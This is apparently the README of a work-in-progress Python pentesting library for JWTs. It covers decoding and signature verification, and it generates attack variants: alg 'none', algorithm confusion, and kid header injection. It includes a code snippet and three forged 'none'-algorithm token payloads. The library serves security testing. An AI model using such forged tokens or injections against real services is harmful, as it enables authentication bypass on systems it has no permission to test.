# PentestJWT - WORK IN PROGRESS !!

Small and simple library for JWTS, only use cases found to be useful are added. Performs simple operations on JWT:
- decodes and encodes JWTs
  - compute signatures (currently only for most common algorithmns, HSxxx and RSxxx)
- generate variations of the provided JWT for most common tests:
  - None signature
  - Signature deception, set alg to HSxxx and signs using contents of file
  - Payload injection in kid, given a test payload, eg, for SQLi, injects the payload in the kid header field. Currently a new signature is not generated

Only Python3 supported !

## Inspect and verify JWT signature
Decode a JWT:
```bash
python3 TestJWT.py jwt_token 
```
Decode a JWT and verify HSxxx signature (as stated in _alg_ header field) using provided secret:
```bash
python3 TestJWT.py jwt_token -s=secret 
```
Decode a JWT and verify RSxxx signature (as stated in _alg_ header field) using provided RSA Public Key in a PEM file:
```bash
python3 TestJWT.py jwt_token -p=path_to_pubkey_pem_file 
```
Decode a JWT and verify RSxxx signature (as stated in _alg_ header field) using provided RSA Public Key in a JWKS file:
```bash
python3 TestJWT.py jwt_token -jwks=path_to_jwks_file 
```
## Pentesting JWTs
*TODO*
Meanwhile, have a look at _Attack.py_ and just write your own script or import the lib in a python interpreter.

### How to obtain the attack payloads
```python
test_jwt_json = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
from TestJWT import TestJWT
jwt = TestJWT.deserialize(test_jwt_json)
import Attack
payloads = Attack.attack_none(jwt)
for payload in payloads.values():
    print(payload)
```
And the payloads are printed:
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
```
